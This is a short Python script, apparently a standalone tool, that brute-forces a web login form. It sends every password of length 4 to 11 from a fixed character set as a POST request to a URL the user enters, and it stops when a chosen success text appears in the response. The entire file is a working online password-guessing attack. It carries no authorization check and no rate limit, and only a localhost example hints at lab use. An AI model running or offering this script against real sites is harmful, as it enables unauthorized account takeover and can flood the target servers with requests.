import itertools
import requests

# Character set
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%*+"
min_len = 4
max_len = 11

# Get input from user
url = input("🔗 Enter the login URL (e.g., http://localhost:8080/login/): ").strip()
success_text = input("✅ Enter success text to look for (e.g., 'Welcome'): ").strip()

# Send POST with password only
def try_login(password):
    data = {
        "pass": password
    }
    try:
        response = requests.post(url, data=data)
        if success_text in response.text:
            print(f"\n🎯 Success! Password found: {password}")
            return True
    except Exception:
        pass
    return False

# Brute-force loop
def main():
    print("\n🚀 Starting brute-force on password field...\n")
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            password = ''.join(combo)
            if try_login(password):
                return

if __name__ == "__main__":
    main()
